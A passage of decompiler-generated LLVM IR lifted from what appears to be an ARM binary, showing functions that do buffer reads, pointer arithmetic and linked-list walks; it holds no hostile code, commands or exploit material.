  %v4_14358 = load i16, i16* %v3_14358, align 2
  %v5_14358 = zext i16 %v4_14358 to i32
  %v2_1435c = xor i32 %v5_14358, 256
  store i32 %v2_1435c, i32* %r3.global-to-local, align 4
  %v2_14360 = trunc i32 %v2_1435c to i16
  store i16 %v2_14360, i16* %v3_14358, align 2
  br label %.thread17

.thread17:                                        ; preds = %.thread13, %bb24
  %v0_14364 = load i32, i32* @r6, align 4
  %v1_14364 = load i32, i32* @r5, align 4
  %v2_14364 = inttoptr i32 %v1_14364 to i32*
  store i32 %v0_14364, i32* %v2_14364, align 4
  ret i32 %v1_14348

; uselistorder directives
  uselistorder i32 %v3_142e8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32)* @function_1537c, { 2, 1, 0 }
  uselistorder label %.thread17, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_14378(i32 %arg1) local_unnamed_addr {
dec_label_pc_14378:
  store i32 123764, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1634c.544 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_14394 = call i32 @function_10b30()
  ret i32 %v0_14394
}

define i32 @function_14480(i32 %arg1) local_unnamed_addr {
dec_label_pc_14480:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14480 = load i32, i32* @r4, align 4
  store i32 %v3_14480, i32* %stack_var_-8, align 4
  %v1_14484 = add i32 %arg1, 8
  %v2_14484 = inttoptr i32 %v1_14484 to i32*
  %v3_14484 = load i32, i32* %v2_14484, align 4
  %v1_14488 = add i32 %arg1, 16
  %v2_14488 = inttoptr i32 %v1_14488 to i32*
  %v3_14488 = load i32, i32* %v2_14488, align 4
  %v9_1448c = icmp eq i32 %v3_14488, %v3_14484
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_1448c, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_14480
  store i32 %v3_14484, i32* %v2_14488, align 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_14480, %bb
  %v1_14498 = xor i1 %v9_1448c, true
  call void @__pseudo_cond_branch(i1 %v1_14498, i32 ptrtoint (i32* @global_var_15768.545 to i32))
  %v0_1449c = load i32, i32* %r4.global-to-local, align 4
  %v1_1449c = add i32 %v0_1449c, 8
  %v2_1449c = inttoptr i32 %v1_1449c to i32*
  %v3_1449c = load i32, i32* %v2_1449c, align 4
  %v1_144a0 = add i32 %v0_1449c, 16
  %v2_144a0 = inttoptr i32 %v1_144a0 to i32*
  %v3_144a0 = load i32, i32* %v2_144a0, align 4
  %v2_144a4 = sub i32 %v3_144a0, %v3_1449c
  %v2_144a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_144a8, i32* @r4, align 4
  ret i32 %v2_144a4

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_144b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_144b0:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_144b0 = load i32, i32* @r4, align 4
  store i32 %v3_144b0, i32* %stack_var_-16, align 4
  %v6_144b0 = load i32, i32* @r5, align 4
  %v12_144b0 = load i32, i32* @lr, align 4
  %v1_144b4 = add i32 %arg1, 52
  %v2_144b4 = inttoptr i32 %v1_144b4 to i32*
  %v3_144b4 = load i32, i32* %v2_144b4, align 4
  %v2_144bc = icmp eq i32 %v3_144b4, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 123764, i32* %r6.global-to-local, align 4
  br i1 %v2_144bc, label %dec_label_pc_144f4, label %dec_label_pc_144d0

dec_label_pc_144d0:                               ; preds = %dec_label_pc_144b0
  %v1_144d0 = add i32 %arg1, 16
  %v2_144d0 = inttoptr i32 %v1_144d0 to i32*
  %v3_144d0 = load i32, i32* %v2_144d0, align 4
  %v1_144d4 = add i32 %arg1, 24
  %v2_144d4 = inttoptr i32 %v1_144d4 to i32*
  %v3_144d4 = load i32, i32* %v2_144d4, align 4
  %v3_144d8 = icmp ult i32 %v3_144d0, %v3_144d4
  br i1 %v3_144d8, label %.thread, label %dec_label_pc_144e8

.thread:                                          ; preds = %dec_label_pc_144d0
  %v2_144dc = inttoptr i32 %v3_144d0 to i8*
  %v3_144dc = load i8, i8* %v2_144dc, align 1
  %v4_144dc = zext i8 %v3_144dc to i32
  store i32 %v4_144dc, i32* %r4.global-to-local, align 4
  %v6_144dc = add i32 %v3_144d0, 1
  store i32 %v6_144dc, i32* %v2_144d0, align 4
  br label %dec_label_pc_14568

dec_label_pc_144e8:                               ; preds = %dec_label_pc_144d0
  %v1_144e8 = inttoptr i32 %arg1 to i16*
  %v2_144e8 = call i32 @function_149dc(i16* %v1_144e8)
  store i32 %v2_144e8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14568

dec_label_pc_144f4:                               ; preds = %dec_label_pc_144b0
  %v1_144f8 = add i32 %arg1, 56
  store i32 %v1_144f8, i32* @r4, align 4
  %v4_1450c = load i32, i32* inttoptr (i32 123836 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1450c)
  %v0_14520 = load i32, i32* %r6.global-to-local, align 4
  %v2_14520 = add i32 %v0_14520, 16
  %v3_14520 = inttoptr i32 %v2_14520 to i32*
  %v4_14520 = load i32, i32* %v3_14520, align 4
  store i32 83244, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14520)
  %v0_1452c = load i32, i32* @r5, align 4
  %v1_1452c = add i32 %v0_1452c, 16
  %v2_1452c = inttoptr i32 %v1_1452c to i32*
  %v3_1452c = load i32, i32* %v2_1452c, align 4
  %v1_14530 = add i32 %v0_1452c, 24
  %v2_14530 = inttoptr i32 %v1_14530 to i32*
  %v3_14530 = load i32, i32* %v2_14530, align 4
  %v3_14534 = icmp ult i32 %v3_1452c, %v3_14530
  br i1 %v3_14534, label %.thread2, label %dec_label_pc_14544

.thread2:                                         ; preds = %dec_label_pc_144f4
  %v2_14538 = inttoptr i32 %v3_1452c to i8*
  %v3_14538 = load i8, i8* %v2_14538, align 1
  %v4_14538 = zext i8 %v3_14538 to i32
  store i32 %v4_14538, i32* %r4.global-to-local, align 4
  %v6_14538 = add i32 %v3_1452c, 1
  store i32 %v6_14538, i32* %v2_1452c, align 4
  br label %dec_label_pc_14550

dec_label_pc_14544:                               ; preds = %dec_label_pc_144f4
  %v1_14548 = inttoptr i32 %v0_1452c to i16*
  %v2_14548 = call i32 @function_149dc(i16* %v1_14548)
  store i32 %v2_14548, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14550

dec_label_pc_14550:                               ; preds = %.thread2, %dec_label_pc_14544
  %v0_1455c = load i32, i32* %r6.global-to-local, align 4
  %v2_1455c = add i32 %v0_1455c, 24
  %v3_1455c = inttoptr i32 %v2_1455c to i32*
  %v4_1455c = load i32, i32* %v3_1455c, align 4
  store i32 %v4_1455c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1455c)
  br label %dec_label_pc_14568

dec_label_pc_14568:                               ; preds = %.thread, %dec_label_pc_144e8, %dec_label_pc_14550
  %v0_14568 = load i32, i32* %r4.global-to-local, align 4
  %v2_14570 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14570, i32* @r4, align 4
  store i32 %v6_144b0, i32* @r5, align 4
  store i32 %v12_144b0, i32* @lr, align 4
  ret i32 %v0_14568

; uselistorder directives
  uselistorder i32 %v3_1452c, { 1, 0, 2 }
  uselistorder i32 %v3_144d0, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 2, 5, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_14568, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14550, { 1, 0 }
}

define i32 @function_1457c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1457c:
  %v0_1457c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1457c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1457c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1457c, %bb
  %v10_14588 = phi i32 [ %arg1, %dec_label_pc_1457c ], [ 0, %bb ]
  ret i32 %v10_14588

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_1458c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1458c:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1458c = load i32, i32* @r4, align 4
  store i32 %v3_1458c, i32* %stack_var_-28, align 4
  %v6_1458c = load i32, i32* @r5, align 4
  %v9_1458c = load i32, i32* @r6, align 4
  %v12_1458c = load i32, i32* @r7, align 4
  %v21_1458c = load i32, i32* @lr, align 4
  %v1_14590 = add i32 %arg3, 52
  %v2_14590 = inttoptr i32 %v1_14590 to i32*
  %v3_14590 = load i32, i32* %v2_14590, align 4
  %v1_14598 = sub i32 1, %v3_14590
  %v2_14598 = icmp ult i32 %v3_14590, 2
  br i1 %v2_14598, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_1458c
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1458c, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_14598, %dec_label_pc_1458c ]
  %v0_145a0 = phi i32 [ 0, %bb ], [ %v1_14598, %dec_label_pc_1458c ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_145a0 = icmp eq i32 %v0_145a0, 0
  store i32 123764, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_145a0, label %dec_label_pc_145f4, label %dec_label_pc_145bc

dec_label_pc_145bc:                               ; preds = %bb16
  %v1_145c0 = add i32 %arg3, 56
  store i32 %v1_145c0, i32* @r4, align 4
  %v4_145d4 = load i32, i32* inttoptr (i32 123836 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_145d4)
  %v0_145e8 = load i32, i32* @r5, align 4
  %v2_145e8 = add i32 %v0_145e8, 16
  %v3_145e8 = inttoptr i32 %v2_145e8 to i32*
  %v4_145e8 = load i32, i32* %v3_145e8, align 4
  store i32 %v4_145e8, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_145f4.555 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_145e8)
  %v0_145f4.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_145f8.pre = load i32, i32* @r7, align 4
  %v0_145fc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_145f4

dec_label_pc_145f4:                               ; preds = %bb16, %dec_label_pc_145bc
  %v0_145fc = phi i32 [ %arg3, %bb16 ], [ %v0_145fc.pre, %dec_label_pc_145bc ]
  %v0_145f8 = phi i32 [ %arg2, %bb16 ], [ %v0_145f8.pre, %dec_label_pc_145bc ]
  %v0_145f4 = phi i32 [ %arg1, %bb16 ], [ %v0_145f4.pre, %dec_label_pc_145bc ]
  %v3_14600 = inttoptr i32 %v0_145f4 to i8*
  %v4_14600 = call i32 @function_14b08(i8* %v3_14600, i32 %v0_145f8, i32 %v0_145fc)
  %v0_14604 = load i32, i32* %sl.global-to-local, align 4
  %v2_14604 = icmp eq i32 %v0_14604, 0
  store i32 %v4_14600, i32* %r4.global-to-local, align 4
  br i1 %v2_14604, label %dec_label_pc_145f4..thread3_crit_edge, label %bb17

dec_label_pc_145f4..thread3_crit_edge:            ; preds = %dec_label_pc_145f4
  %v0_14620.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_145f4
  %v1_14618 = load i32, i32* @r5, align 4
  %v3_14618 = add i32 %v1_14618, 24
  %v4_14618 = inttoptr i32 %v3_14618 to i32*
  %v5_14618 = load i32, i32* %v4_14618, align 4
  store i32 %v5_14618, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_145f4..thread3_crit_edge, %bb17
  %v0_14620 = phi i32 [ %v0_14620.pre, %dec_label_pc_145f4..thread3_crit_edge ], [ %v5_14618, %bb17 ]
  %v2_14620 = xor i1 %v2_14604, true
  call void @__pseudo_cond_branch(i1 %v2_14620, i32 %v0_14620)
  %v0_14624 = load i32, i32* %r4.global-to-local, align 4
  %v2_1462c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_1462c, i32* %r4.global-to-local, align 4
  store i32 %v6_1458c, i32* @r5, align 4
  store i32 %v9_1458c, i32* @r6, align 4
  store i32 %v12_1458c, i32* @r7, align 4
  store i32 %v21_1458c, i32* @lr, align 4
  ret i32 %v0_14624

; uselistorder directives
  uselistorder i32 %v3_14590, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 52, { 10, 11, 12, 13, 14, 4, 15, 8, 9, 5, 17, 18, 2, 19, 0, 20, 21, 6, 7, 1, 16, 3 }
  uselistorder i32 %arg3, { 0, 3, 1, 2 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_145f4, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_14638(i32 %arg1) local_unnamed_addr {
dec_label_pc_14638:
  %v0_14638 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14638, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14638
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14638, %bb
  %v10_14644 = phi i32 [ %arg1, %dec_label_pc_14638 ], [ 0, %bb ]
  ret i32 %v10_14644

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_14648() local_unnamed_addr {
dec_label_pc_14648:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14648 = load i32, i32* @r4, align 4
  store i32 %v3_14648, i32* %stack_var_-24, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 123764, i32* %r6.global-to-local, align 4
  %v4_14658 = load i32, i32* inttoptr (i32 123800 to i32*), align 8
  store i32 %v4_14658, i32* %r8.global-to-local, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_14660 = load i32, i32* inttoptr (i32 123872 to i32*), align 32
  store i32 %v4_14660, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_1466c = load i32, i32* inttoptr (i32 123836 to i32*), align 4
  store i32 %v4_1466c, i32* %r7.global-to-local, align 4
  %v2_14678 = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_1466c)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_1468c = load i32, i32* %r6.global-to-local, align 4
  %v2_1468c = add i32 %v0_1468c, 16
  %v3_1468c = inttoptr i32 %v2_1468c to i32*
  %v4_1468c = load i32, i32* %v3_1468c, align 4
  store i32 %v4_1468c, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1468c)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_1469c = load i32, i32* %r6.global-to-local, align 4
  %v2_1469c = add i32 %v0_1469c, 12
  %v3_1469c = inttoptr i32 %v2_1469c to i32*
  %v4_1469c = load i32, i32* %v3_1469c, align 4
  store i32 %v4_1469c, i32* %r3.global-to-local, align 4
  %v1_146a0 = inttoptr i32 %v4_1469c to i32*
  %v2_146a0 = load i32, i32* %v1_146a0, align 4
  store i32 %v2_146a0, i32* %r3.global-to-local, align 4
  %v7_146a4 = icmp eq i32 %v2_146a0, 1
  br i1 %v7_146a4, label %dec_label_pc_146ac, label %dec_label_pc_1476c

dec_label_pc_146ac:                               ; preds = %dec_label_pc_14648
  store i32 48, i32* %r3.global-to-local, align 4
  %v2_146b0 = add i32 %v0_1469c, 48
  %v3_146b0 = inttoptr i32 %v2_146b0 to i32*
  %v4_146b0 = load i32, i32* %v3_146b0, align 4
  store i32 %v4_146b0, i32* %r3.global-to-local, align 4
  %v1_146b4 = inttoptr i32 %v4_146b0 to i32*
  %v2_146b4 = load i32, i32* %v1_146b4, align 4
  store i32 %v2_146b4, i32* %r3.global-to-local, align 4
  %tmp30 = icmp slt i32 %v2_146b4, 1
  br i1 %tmp30, label %dec_label_pc_1476c, label %dec_label_pc_146c0

dec_label_pc_146c0:                               ; preds = %dec_label_pc_146ac
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_146c4 = add i32 %v0_1469c, 96
  %v3_146c4 = inttoptr i32 %v2_146c4 to i32*
  %v4_146c4 = load i32, i32* %v3_146c4, align 4
  store i32 %v4_146c4, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1466c)
  call void @__pseudo_branch(i32 %v4_1468c)
  %v0_146ec = load i32, i32* %r6.global-to-local, align 4
  %v2_146ec = add i32 %v0_146ec, 44
  %v3_146ec = inttoptr i32 %v2_146ec to i32*
  %v4_146ec = load i32, i32* %v3_146ec, align 4
  store i32 %v4_146ec, i32* %r3.global-to-local, align 4
  %v1_146f0 = inttoptr i32 %v4_146ec to i32*
  %v2_146f0 = load i32, i32* %v1_146f0, align 4
  store i32 %v2_146f0, i32* %r4.global-to-local, align 4
  store i32 44, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1473c11 = icmp eq i32 %v2_146f0, 0
  br i1 %v2_1473c11, label %dec_label_pc_14748, label %dec_label_pc_14700

dec_label_pc_14700:                               ; preds = %dec_label_pc_146c0, %dec_label_pc_14738
  %v0_147242 = phi i32 [ %v0_14738, %dec_label_pc_14738 ], [ %v2_146f0, %dec_label_pc_146c0 ]
  %v1_14700 = inttoptr i32 %v0_147242 to i16*
  %v2_14700 = load i16, i16* %v1_14700, align 2
  %v3_14700 = zext i16 %v2_14700 to i32
  store i32 %v3_14700, i32* %r3.global-to-local, align 4
  %v2_14704 = and i32 %v3_14700, 32816
  %v7_14708 = icmp eq i32 %v2_14704, 48
  %v1_1470c = add i32 %v0_147242, 32
  %v2_1470c = inttoptr i32 %v1_1470c to i32*
  %v3_1470c = load i32, i32* %v2_1470c, align 4
  store i32 %v3_1470c, i32* %r5.global-to-local, align 4
  br i1 %v7_14708, label %dec_label_pc_14718, label %.thread21

.thread21:                                        ; preds = %dec_label_pc_14700
  store i32 %v0_147242, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14738

dec_label_pc_14718:                               ; preds = %dec_label_pc_14700
  %v0_14718 = load i32, i32* %r7.global-to-local, align 4
  %v2_14718 = icmp eq i32 %v0_14718, 0
  br i1 %v2_14718, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_14718
  %v1_1471c = load i32, i32* %r6.global-to-local, align 4
  %v2_1471c = load i32, i32* %r8.global-to-local, align 4
  %v3_1471c = add i32 %v2_1471c, %v1_1471c
  %v4_1471c = inttoptr i32 %v3_1471c to i32*
  %v5_1471c = load i32, i32* %v4_1471c, align 4
  store i32 %v5_1471c, i32* %r3.global-to-local, align 4
  %v3_14720 = inttoptr i32 %v5_1471c to i32*
  store i32 %v3_1470c, i32* %v3_14720, align 4
  %v0_14724 = load i32, i32* %r4.global-to-local, align 4
  %v1_14724 = inttoptr i32 %v0_14724 to i16*
  %v2_14724 = load i16, i16* %v1_14724, align 2
  %v3_14724 = zext i16 %v2_14724 to i32
  store i32 %v3_14724, i32* %r3.global-to-local, align 4
  br label %bb31

bb:                                               ; preds = %dec_label_pc_14718
  %v2_147248 = load i16, i16* %v1_14700, align 2
  %v3_147249 = zext i16 %v2_147248 to i32
  store i32 %v3_147249, i32* %r3.global-to-local, align 4
  %v3_14728 = add i32 %v0_14718, 32
  %v4_14728 = inttoptr i32 %v3_14728 to i32*
  store i32 %v3_1470c, i32* %v4_14728, align 4
  %v0_1472c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %.thread, %bb
  %v0_1472c = phi i32 [ %v3_14724, %.thread ], [ %v0_1472c.pre, %bb ]
  %v1_1472c = and i32 %v0_1472c, 8192
  %v2_1472c = icmp eq i32 %v1_1472c, 0
  br i1 %v2_1472c, label %bb33, label %bb32

bb32:                                             ; preds = %bb31
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_14734 = xor i1 %v2_1472c, true
  call void @__pseudo_cond_branch(i1 %v1_14734, i32 ptrtoint (i32* @global_var_120a4.55 to i32))
  %v0_14738.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14738

dec_label_pc_14738:                               ; preds = %.thread21, %bb33
  %v0_14738 = phi i32 [ %v0_14738.pre, %bb33 ], [ %v3_1470c, %.thread21 ]
  store i32 %v0_14738, i32* %r4.global-to-local, align 4
  %v2_1473c = icmp eq i32 %v0_14738, 0
  br i1 %v2_1473c, label %dec_label_pc_1473c.dec_label_pc_14748_crit_edge, label %dec_label_pc_14700

dec_label_pc_1473c.dec_label_pc_14748_crit_edge:  ; preds = %dec_label_pc_14738
  %v0_14754.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14748

dec_label_pc_14748:                               ; preds = %dec_label_pc_1473c.dec_label_pc_14748_crit_edge, %dec_label_pc_146c0
  %v0_14754 = phi i32 [ %v0_14754.pre, %dec_label_pc_1473c.dec_label_pc_14748_crit_edge ], [ %v0_146ec, %dec_label_pc_146c0 ]
  store i32 24, i32* %r3.global-to-local, align 4
  %v2_14754 = add i32 %v0_14754, 24
  %v3_14754 = inttoptr i32 %v2_14754 to i32*
  %v4_14754 = load i32, i32* %v3_14754, align 4
  call void @__pseudo_branch(i32 %v4_14754)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_14764 = load i32, i32* %r6.global-to-local, align 4
  %v2_14764 = add i32 %v0_14764, 48
  %v3_14764 = inttoptr i32 %v2_14764 to i32*
  %v4_14764 = load i32, i32* %v3_14764, align 4
  store i32 %v4_14764, i32* %r3.global-to-local, align 4
  %v0_14768 = load i32, i32* %r4.global-to-local, align 4
  %v2_14768 = inttoptr i32 %v4_14764 to i32*
  store i32 %v0_14768, i32* %v2_14768, align 4
  %v0_14770.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1476c

dec_label_pc_1476c:                               ; preds = %dec_label_pc_14648, %dec_label_pc_146ac, %dec_label_pc_14748
  %v0_14770 = phi i32 [ %v0_1469c, %dec_label_pc_14648 ], [ %v0_1469c, %dec_label_pc_146ac ], [ %v0_14770.pre, %dec_label_pc_14748 ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_14770 = add i32 %v0_14770, 12
  %v3_14770 = inttoptr i32 %v2_14770 to i32*
  %v4_14770 = load i32, i32* %v3_14770, align 4
  %v1_14774 = inttoptr i32 %v4_14770 to i32*
  %v2_14774 = load i32, i32* %v1_14774, align 4
  %v1_14778 = add i32 %v2_14774, -1
  store i32 %v1_14778, i32* %v1_14774, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_1478c = load i32, i32* %r6.global-to-local, align 4
  %v2_1478c = add i32 %v0_1478c, 24
  %v3_1478c = inttoptr i32 %v2_1478c to i32*
  %v4_1478c = load i32, i32* %v3_1478c, align 4
  call void @__pseudo_branch(i32 %v4_1478c)
  %v2_1479c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1479c, i32* %r4.global-to-local, align 4
  ret i32 %v2_14678

; uselistorder directives
  uselistorder i32 %v0_14738, { 2, 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r6.global-to-local, { 4, 0, 5, 1, 6, 7, 2, 3, 8 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 4, 3, 5, 6, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 13, 14, 15, 16, 17, 11, 12, 18, 19, 20, 21, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* inttoptr (i32 123800 to i32*), { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1476c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14738, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_14700, { 1, 0 }
}

define i32 @function_147a8(i16* %arg1) local_unnamed_addr {
dec_label_pc_147a8:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v0_147a8 = load i1, i1* @cpsr_z, align 1
  %v2_147a8 = load i32, i32* @r4, align 4
  br i1 %v0_147a8, label %bb, label %dec_label_pc_147a8..thread8_crit_edge

dec_label_pc_147a8..thread8_crit_edge:            ; preds = %dec_label_pc_147a8
  %v0_147e4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread8

bb:                                               ; preds = %dec_label_pc_147a8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_147a8..thread8_crit_edge, %bb
  %v0_14984 = phi i32 [ %v0_147e4.pre, %dec_label_pc_147a8..thread8_crit_edge ], [ 0, %bb ]
  store i32 %v2_147a8, i32* %stack_var_-36, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 123764, i32* %sb.global-to-local, align 4
  %v4_147e0 = load i32, i32* inttoptr (i32 123808 to i32*), align 32
  store i32 %v4_147e0, i32* %r3.global-to-local, align 4
  %v9_147e4 = icmp eq i32 %v0_14984, %v4_147e0
  store i32 %v0_14984, i32* %fp.global-to-local, align 4
  br i1 %v9_147e4, label %bb49, label %dec_label_pc_147fc

bb49:                                             ; preds = %.thread8
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1480c

dec_label_pc_147fc:                               ; preds = %.thread8
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_14800 = icmp eq i32 %v0_14984, 0
  br i1 %v2_14800, label %dec_label_pc_1480c, label %dec_label_pc_14974

dec_label_pc_1480c:                               ; preds = %bb49, %dec_label_pc_147fc
  %stack_var_-60.1.in = phi i32 [ 0, %bb49 ], [ 256, %dec_label_pc_147fc ]
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_14820 = load i32, i32* inttoptr (i32 123872 to i32*), align 32
  store i32 %v4_14820, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_14828 = ptrtoint i32* %stack_var_-56 to i32
  %v4_1482c = load i32, i32* inttoptr (i32 123836 to i32*), align 4
  store i32 16, i32* %stack_var_-72, align 4
  store i32 %v2_14828, i32* %r0.global-to-local, align 4
  store i32 %v4_14820, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1482c)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_1484c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1484c, i32* %r0.global-to-local, align 4
  %v0_14850 = load i32, i32* %sb.global-to-local, align 4
  %v2_14850 = add i32 %v0_14850, 16
  %v3_14850 = inttoptr i32 %v2_14850 to i32*
  %v4_14850 = load i32, i32* %v3_14850, align 4
  call void @__pseudo_branch(i32 %v4_14850)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_14860 = add i32 %v0_14850, 12
  %v3_14860 = inttoptr i32 %v2_14860 to i32*
  %v4_14860 = load i32, i32* %v3_14860, align 4
  store i32 %v4_14860, i32* %r2.global-to-local, align 4
  %v1_14864 = inttoptr i32 %v4_14860 to i32*
  %v2_14864 = load i32, i32* %v1_14864, align 4
  store i32 24, i32* %sl.global-to-local, align 4
  %v1_1486c = add i32 %v2_14864, 1
  store i32 %v1_1486c, i32* %r3.global-to-local, align 4
  %v2_14870 = add i32 %v0_14850, 24
  %v3_14870 = inttoptr i32 %v2_14870 to i32*
  %v4_14870 = load i32, i32* %v3_14870, align 4
  store i32 %v1_1486c, i32* %v1_14864, align 4
  store i32 %v2_14828, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14870)
  store i32 96, i32* %r3.global-to-local, align 4
  %v0_1488c = load i32, i32* %sb.global-to-local, align 4
  %v2_1488c = add i32 %v0_1488c, 96
  %v3_1488c = inttoptr i32 %v2_1488c to i32*
  %v4_1488c = load i32, i32* %v3_1488c, align 4
  store i32 %v4_1488c, i32* @r4, align 4
  store i32 %v4_1488c, i32* %r2.global-to-local, align 4
  store i32 %v2_14828, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1482c)
  %v0_148a4 = load i32, i32* @r4, align 4
  store i32 %v0_148a4, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14850)
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_148b4 = load i32, i32* %sb.global-to-local, align 4
